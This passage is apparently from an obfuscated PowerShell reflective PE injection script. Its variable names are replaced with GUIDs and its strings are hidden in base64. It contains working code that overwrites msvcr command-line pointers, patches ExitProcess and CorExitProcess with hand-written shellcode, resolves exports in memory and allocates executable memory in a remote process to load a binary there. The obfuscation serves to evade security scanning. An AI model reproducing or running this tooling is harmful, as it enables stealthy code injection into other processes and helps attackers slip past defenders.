			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach ($Dll in ${7189cf6382ca40ecb50c4c33384b7cbf})
		{
			[IntPtr]$DllHandle = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke($DllHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]$ACmdLnAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke($DllHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${16243fed339147fe980cef48ce2c9953} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${e9d488658e5045cdb725ead7e42bcfa8})
				${dc24cd2d476c41f09d260c7465dc2854} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${e9d488658e5045cdb725ead7e42bcfa8})
				${86f125c0e1dc4ad2b982a561fb980a4b} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				${044b149f5b60404fba91cced780e50a4} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				${407c975371b24afcbf905ea38ab39d8b} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${316b88f6ef8c400aac88c3cceb745ea2})
				${c5cedabd58b04036ac9e93ceaa1a1f46} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${316b88f6ef8c400aac88c3cceb745ea2})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${86f125c0e1dc4ad2b982a561fb980a4b}, ${407c975371b24afcbf905ea38ab39d8b}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${044b149f5b60404fba91cced780e50a4}, ${c5cedabd58b04036ac9e93ceaa1a1f46}, $false)
				${ebd86bbbfe5c487495a61c9f406547aa} += ,($ACmdLnAddr, ${407c975371b24afcbf905ea38ab39d8b}, ${316b88f6ef8c400aac88c3cceb745ea2})
				${ebd86bbbfe5c487495a61c9f406547aa} += ,($WCmdLnAddr, ${c5cedabd58b04036ac9e93ceaa1a1f46}, ${316b88f6ef8c400aac88c3cceb745ea2})
				${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]${316b88f6ef8c400aac88c3cceb745ea2}, [UInt32](${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if (${bfd6b4588cf14a19b91ca177e24a9fe3} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${16243fed339147fe980cef48ce2c9953}, $ACmdLnAddr, $false)
				${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]${316b88f6ef8c400aac88c3cceb745ea2}, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]${316b88f6ef8c400aac88c3cceb745ea2}, [UInt32](${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if (${bfd6b4588cf14a19b91ca177e24a9fe3} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${dc24cd2d476c41f09d260c7465dc2854}, $WCmdLnAddr, $false)
				${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]${316b88f6ef8c400aac88c3cceb745ea2}, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		${ebd86bbbfe5c487495a61c9f406547aa} = @()
		${193ea816268642699592f69796954a53} = @() 
		[IntPtr]$MscoreeHandle = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]$CorExitProcessAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke($MscoreeHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${193ea816268642699592f69796954a53} += $CorExitProcessAddr
		[IntPtr]$ExitProcessAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke(${81f04b18eb70444ab2797c3a533e47a1}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${193ea816268642699592f69796954a53} += $ExitProcessAddr
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in ${193ea816268642699592f69796954a53})
		{
			${92634bc4f29344c797b8c820536fa478} = $ProcExitFunctionAddr
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${316b88f6ef8c400aac88c3cceb745ea2} -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			${71d351e968b84b0682d5a96461c6f7d1} = $Shellcode1.Length + ${316b88f6ef8c400aac88c3cceb745ea2} + $Shellcode2.Length + ${316b88f6ef8c400aac88c3cceb745ea2} + $Shellcode3.Length
			[IntPtr]$ExitThreadAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke(${81f04b18eb70444ab2797c3a533e47a1}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]${71d351e968b84b0682d5a96461c6f7d1}, [UInt32]${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${2070d650efcd4a4f8bf902b5c4a6b1a7} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${71d351e968b84b0682d5a96461c6f7d1})
			${e68f649120fc4868841a2d8eea9e08f5}.memcpy.Invoke(${2070d650efcd4a4f8bf902b5c4a6b1a7}, $ProcExitFunctionAddr, [UInt64]${71d351e968b84b0682d5a96461c6f7d1}) | Out-Null
			${ebd86bbbfe5c487495a61c9f406547aa} += ,($ProcExitFunctionAddr, ${2070d650efcd4a4f8bf902b5c4a6b1a7}, ${71d351e968b84b0682d5a96461c6f7d1})
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode1 -ed8e2beac355444db175543089c05e66 ${92634bc4f29344c797b8c820536fa478}
			${92634bc4f29344c797b8c820536fa478} = Add-SignedIntAsUnsigned ${92634bc4f29344c797b8c820536fa478} ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${a58ef014534245c991e74b19306d6cb3}, ${92634bc4f29344c797b8c820536fa478}, $false)
			${92634bc4f29344c797b8c820536fa478} = Add-SignedIntAsUnsigned ${92634bc4f29344c797b8c820536fa478} ${316b88f6ef8c400aac88c3cceb745ea2}
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode2 -ed8e2beac355444db175543089c05e66 ${92634bc4f29344c797b8c820536fa478}
			${92634bc4f29344c797b8c820536fa478} = Add-SignedIntAsUnsigned ${92634bc4f29344c797b8c820536fa478} ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, ${92634bc4f29344c797b8c820536fa478}, $false)
			${92634bc4f29344c797b8c820536fa478} = Add-SignedIntAsUnsigned ${92634bc4f29344c797b8c820536fa478} ${316b88f6ef8c400aac88c3cceb745ea2}
			Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode3 -ed8e2beac355444db175543089c05e66 ${92634bc4f29344c797b8c820536fa478}
			${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]${71d351e968b84b0682d5a96461c6f7d1}, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		echo ${ebd86bbbfe5c487495a61c9f406547aa}
	}
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${cc2e4d7defdc427bb7379a767e207a0e},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23}
		)
		[UInt32]$OldProtectFlag = 0
		foreach ($Info in ${cc2e4d7defdc427bb7379a767e207a0e})
		{
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${e68f649120fc4868841a2d8eea9e08f5}.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${dd4b2676e8224a01aaf12b89b05f1b62},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${bcef229339c34b6aa25db34ee4c417ae}
		)
		${e39002e42e324234be4b9268daddc239} = Get-Win32Types
		${a851be47767a4e43b58c4498cda85d23} = Get-Win32Constants
		${a6f1c45867c645738edd3413cf0d7718} = Get-PEDetailedInfo -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23}
		if (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${ad3edcad83ed4d97a2d6c433a2cd4b40} = Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${9d2c3dc72a1d4cbe81d5988d0e6749e5} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${ad3edcad83ed4d97a2d6c433a2cd4b40}, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_EXPORT_DIRECTORY)
		for (${9282212b31e84e3ca7221e3fcd69f077} = 0; ${9282212b31e84e3ca7221e3fcd69f077} -lt ${9d2c3dc72a1d4cbe81d5988d0e6749e5}.NumberOfNames; ${9282212b31e84e3ca7221e3fcd69f077}++)
		{
			${955cb38fe31248b79214f3d64aa2eaa3} = Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) (${9d2c3dc72a1d4cbe81d5988d0e6749e5}.AddressOfNames + (${9282212b31e84e3ca7221e3fcd69f077} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${ffbd1a6bcab8428893548d84184ba493} = Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${955cb38fe31248b79214f3d64aa2eaa3}, [Type][UInt32]))
			${280e638c8e5e4a0891dc90777306aede} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${ffbd1a6bcab8428893548d84184ba493})
			if (${280e638c8e5e4a0891dc90777306aede} -ceq ${bcef229339c34b6aa25db34ee4c417ae})
			{
				${fde3b74c2fab44089f5f14ee26699bc6} = Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) (${9d2c3dc72a1d4cbe81d5988d0e6749e5}.AddressOfNameOrdinals + (${9282212b31e84e3ca7221e3fcd69f077} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${0026259b64cc4d6dba0f95aa449e435f} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${fde3b74c2fab44089f5f14ee26699bc6}, [Type][UInt16])
				${452e67b9aeb0450aa5dd337c6671f0cf} = Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) (${9d2c3dc72a1d4cbe81d5988d0e6749e5}.AddressOfFunctions + (${0026259b64cc4d6dba0f95aa449e435f} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${d69c66f8a80b47a99832ddad1fb16f52} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${452e67b9aeb0450aa5dd337c6671f0cf}, [Type][UInt32])
				return Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) (${d69c66f8a80b47a99832ddad1fb16f52})
			}
		}
		return [IntPtr]::Zero
	}
	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${dd84f627e34042a19d0e69bbfb56125d},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${eae5ed9674894f6898fbef0835eef491},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${dbc8e071ba554a5991d5c23be7628337},
        [Parameter(Position = 3)]
        [Bool]
        ${af14924eb7024c53a36e0e49783042b6} = $false
		)
		${316b88f6ef8c400aac88c3cceb745ea2} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${a851be47767a4e43b58c4498cda85d23} = Get-Win32Constants
		${e68f649120fc4868841a2d8eea9e08f5} = Get-Win32Functions
		${e39002e42e324234be4b9268daddc239} = Get-Win32Types
		${f229a27ea82c4771b75975fc5836337f} = $false
		if ((${dbc8e071ba554a5991d5c23be7628337} -ne $null) -and (${dbc8e071ba554a5991d5c23be7628337} -ne [IntPtr]::Zero))
		{
			${f229a27ea82c4771b75975fc5836337f} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${a6f1c45867c645738edd3413cf0d7718} = Get-PEBasicInfo -dd84f627e34042a19d0e69bbfb56125d ${dd84f627e34042a19d0e69bbfb56125d} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239}
		${bbcbfc25b29142cebda6a3ecf7dde05f} = ${a6f1c45867c645738edd3413cf0d7718}.OriginalImageBase
		${829c848dbac54130b8bf1d0113439da7} = $true
		if (([Int] ${a6f1c45867c645738edd3413cf0d7718}.DllCharacteristics -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne ${a851be47767a4e43b58c4498cda85d23}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${829c848dbac54130b8bf1d0113439da7} = $false
		}
		${36493e289ad04f54a202b19f60719b16} = $true
		if (${f229a27ea82c4771b75975fc5836337f} -eq $true)
		{
			${81f04b18eb70444ab2797c3a533e47a1} = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke(${81f04b18eb70444ab2797c3a533e47a1}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${ad4a1ce275f0418bb89955c7769f006a} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]$Wow64Process = $false
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.IsWow64Process.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [Ref]$Wow64Process)
			if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${36493e289ad04f54a202b19f60719b16} = $false
			}
			${c31f5ed9b5bf4718bf290515eec2620f} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${c31f5ed9b5bf4718bf290515eec2620f} = $false
			}
			if (${c31f5ed9b5bf4718bf290515eec2620f} -ne ${36493e289ad04f54a202b19f60719b16})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${36493e289ad04f54a202b19f60719b16} = $false
			}
		}
		if (${36493e289ad04f54a202b19f60719b16} -ne ${a6f1c45867c645738edd3413cf0d7718}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        ${15e3031de06a424093eb3728f85ed5b2} = ([Int] ${a6f1c45867c645738edd3413cf0d7718}.DllCharacteristics -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq ${a851be47767a4e43b58c4498cda85d23}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not ${af14924eb7024c53a36e0e49783042b6}) -and (-not ${15e3031de06a424093eb3728f85ed5b2}))
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuACAATwBSACAAdAByAHkAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAC0ARgBvAHIAYwBlAEEAUwBMAFIAIABmAGwAYQBnACAAKABjAG8AdQBsAGQAIABjAGEAdQBzAGUAIABjAHIAYQBzAGgAZQBzACkA'))) -WarningAction Continue
			[IntPtr]$LoadAddr = ${bbcbfc25b29142cebda6a3ecf7dde05f}
		}
        elseif (${af14924eb7024c53a36e0e49783042b6} -and (-not ${15e3031de06a424093eb3728f85ed5b2}))
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAQQBTAEwAUgAgAGIAdQB0ACAALQBGAG8AcgBjAGUAQQBTAEwAUgAgAGkAcwAgAHMAZQB0AC4AIABGAG8AcgBjAGkAbgBnACAAQQBTAEwAUgAgAG8AbgAgAHQAaABlACAAUABFACAAZgBpAGwAZQAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHIAZQBzAHUAbAB0ACAAaQBuACAAYQAgAGMAcgBhAHMAaAAuAA==')))
        }
        if (${af14924eb7024c53a36e0e49783042b6} -and ${f229a27ea82c4771b75975fc5836337f})
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIAB1AHMAZQAgAEYAbwByAGMAZQBBAFMATABSACAAdwBoAGUAbgAgAGwAbwBhAGQAaQBuAGcAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4A'))) -ErrorAction Stop
        }
        if (${f229a27ea82c4771b75975fc5836337f} -and (-not ${15e3031de06a424093eb3728f85ed5b2}))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSAC4AIABDAGEAbgBuAG8AdAAgAGwAbwBhAGQAIABhACAAbgBvAG4ALQBBAFMATABSACAAUABFACAAaQBuACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwA='))) -ErrorAction Stop
        }
		${dd4b2676e8224a01aaf12b89b05f1b62} = [IntPtr]::Zero				
		${e7e7ac3edc0d4ffb98eb836b45e69437} = [IntPtr]::Zero		
		if (${f229a27ea82c4771b75975fc5836337f} -eq $true)
		{
			${dd4b2676e8224a01aaf12b89b05f1b62} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${a6f1c45867c645738edd3413cf0d7718}.SizeOfImage, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE)
			${e7e7ac3edc0d4ffb98eb836b45e69437} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, $LoadAddr, [UIntPtr]${a6f1c45867c645738edd3413cf0d7718}.SizeOfImage, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE)
			if (${e7e7ac3edc0d4ffb98eb836b45e69437} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${829c848dbac54130b8bf1d0113439da7} -eq $true)
			{
				${dd4b2676e8224a01aaf12b89b05f1b62} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]${a6f1c45867c645738edd3413cf0d7718}.SizeOfImage, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE)
			}
			else
			{
